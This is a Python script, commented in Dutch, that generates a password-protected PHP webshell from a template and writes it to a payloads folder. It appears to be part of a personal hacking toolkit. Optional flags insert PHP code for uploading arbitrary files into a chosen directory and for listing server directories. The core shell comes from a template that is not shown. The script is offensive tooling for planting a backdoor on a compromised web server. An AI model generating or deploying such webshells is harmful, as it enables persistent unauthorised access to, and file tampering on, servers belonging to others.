#!/usr/bin/python3

# PHP Webshell generator
# Leest template, vervangt placeholders, schrijft naar http/payloads/shell.php

from meuk.hacksec import *

parser = argparse.ArgumentParser()
parser.add_argument("password", help="wachtwoord voor webshell authenticatie")
parser.add_argument("password_field", help="POST parameter naam voor wachtwoord", nargs="?", default="k")
parser.add_argument("--upload", action="store_true", help="upload functionaliteit toevoegen")
parser.add_argument("--filebrowser", action="store_true", help="file browser functionaliteit toevoegen")
args = parser.parse_args()

print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Generating PHP webshell with password field '{bcolors.OKGREEN}{args.password_field}{bcolors.OKBLUE}'{bcolors.ENDC}")

template = lezen("meuk/template/phpshell.php")

shell = template.replace("[password]", args.password)
shell = shell.replace("[password_field]", args.password_field)

# Bouw features blok
features = []
if args.upload:
    features.append(
        "if(isset($_FILES['f'])){"
        "move_uploaded_file($_FILES['f']['tmp_name'],$_POST['d'].'/'.$_FILES['f']['name']);"
        "echo 'Upload OK: '.$_FILES['f']['name'];}"
    )
if args.filebrowser:
    features.append(
        "if(isset($_POST['ls'])){"
        "$d=$_POST['ls'];$h=scandir($d);"
        "echo '<pre>';foreach($h as $f){echo $f.\"\\n\";}echo '</pre>';}"
    )

shell = shell.replace("[features]", "\n".join(features))

schrijven("http/payloads/shell.php", shell)
print(f"{bcolors.BOLD}{bcolors.OKGREEN}[+] Webshell geschreven naar: http/payloads/shell.php{bcolors.ENDC}")
